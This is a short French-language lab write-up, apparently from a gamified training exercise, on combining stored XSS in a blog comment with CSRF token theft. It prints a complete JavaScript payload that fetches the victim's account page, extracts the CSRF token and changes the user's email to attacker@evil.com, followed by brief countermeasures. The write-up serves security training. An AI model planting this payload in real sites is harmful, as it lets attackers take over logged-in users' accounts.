# 🧪 Mission 3.1 – XSS Persistant Avancé + Contournement CSRF

## 🎯 Objectif
Exploiter une faille XSS stockée dans un champ de commentaire pour automatiser une attaque sur l'utilisateur connecté (ex. : changement d’email), en contournant la protection CSRF.

## 🔍 Contexte
- L’utilisateur connecté consulte une page de blog.
- Un commentaire injecté déclenche un script invisible.
- Le script vole un token CSRF et exécute une action POST.

## 💉 Payload utilisé

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var change = new XMLHttpRequest();
    change.open('POST', '/my-account/change-email', true);
    change.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    change.send('csrf=' + token + '&email=attacker@evil.com');
  };
  req.open('GET', '/my-account', true);
  req.send();
</script>
✅ Résultat
L’email de l’utilisateur connecté est modifié.

Le script est exécuté silencieusement.

XSS combiné à une attaque CSRF réussie.

🛡️ Contre-mesures
Échapper toutes les entrées utilisateur.

Ne jamais afficher un token sensible dans une page.

Content-Security-Policy stricte (script-src 'self').

🏅 Badge : Payload Engineer
yaml
Copier
Modifier
